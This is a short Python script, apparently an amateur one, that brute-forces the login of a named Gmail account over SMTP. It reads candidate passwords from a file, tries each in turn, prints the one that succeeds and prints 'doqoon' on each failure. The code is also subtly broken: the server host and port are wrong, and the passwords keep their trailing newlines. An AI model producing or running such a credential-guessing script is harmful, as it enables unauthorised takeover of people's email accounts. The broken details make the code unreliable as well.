import smtplib

smtpserver = smtplib.SMTP("smt.gmail.com", 52)
smtpserver.ehlo()
smtpserver.starttls()


usr = "fikrado1.2@gmail.com"
passwfile = open("/password.txt")

for password in passwfile:
    try:
            smtpserver.login(usr, password)

            print(password)
            break;
    except smtplib.SMTPAuthenticationError:
        print("doqoon")
